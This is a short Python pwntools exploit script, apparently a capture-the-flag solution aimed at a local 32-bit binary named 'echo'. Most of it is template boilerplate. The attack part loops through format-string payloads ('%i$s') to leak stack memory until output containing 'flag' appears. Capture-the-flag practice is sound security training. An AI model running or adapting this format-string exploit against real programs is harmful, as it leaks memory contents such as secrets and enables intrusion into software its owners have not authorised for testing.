#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './echo'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b main
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
for i in range(1,32):
    try:
        p = start()
        p.recvline()
        p.recvline()
        p.recvline()
        payload = f"%{i}$s"
        p.sendline(bytes(payload, "utf8"))
        res = p.recvline()
        if b"flag" in res:
            print(res.decode("utf8"))
            break
    except:
        continue
